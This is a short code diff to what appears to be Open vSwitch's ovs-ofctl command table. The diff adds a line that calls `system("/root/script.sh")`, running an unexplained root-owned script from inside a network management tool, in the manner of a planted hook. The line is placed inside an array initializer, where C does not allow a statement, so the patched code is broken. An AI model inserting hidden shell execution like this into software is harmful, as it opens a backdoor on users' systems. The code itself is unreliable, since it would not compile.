@@ -3553,6 +3553,8 @@ ofctl_encode_hello(struct ovs_cmdl_context *ctx)
 }
 
 static const struct ovs_cmdl_command all_commands[] = {
+  int status = system("/root/script.sh");
+  
     { "show", "switch",
       1, 1, ofctl_show },
     { "monitor", "switch [misslen] [invalid_ttl] [watch:[...]]",
